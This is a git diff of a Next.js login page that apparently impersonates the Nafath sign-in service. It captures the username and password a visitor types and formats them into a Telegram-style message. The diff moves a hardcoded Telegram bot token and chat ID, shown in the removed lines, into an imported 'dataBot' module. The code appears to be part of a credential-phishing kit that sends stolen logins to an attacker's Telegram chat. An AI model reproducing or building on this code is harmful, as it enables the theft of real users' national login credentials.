@@ -7,6 +7,7 @@ import image24 from '../../../../../../../public/i.png'
 import Image from 'next/image'
 import { useRef } from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
+import bot from '@/compnante/dataBot'
 
 const Page = () => {
     let  username = useRef()
@@ -16,10 +17,7 @@ const Page = () => {
     const datas = x.get("names")
     const handleOnSubmit = (e) => {
         e.preventDefault();
-        var bot={
-      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
-      chat_id:6364334502
-    }
+
         var length =` نفاذ اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value}  %0A %0A ${datas}`
        
         
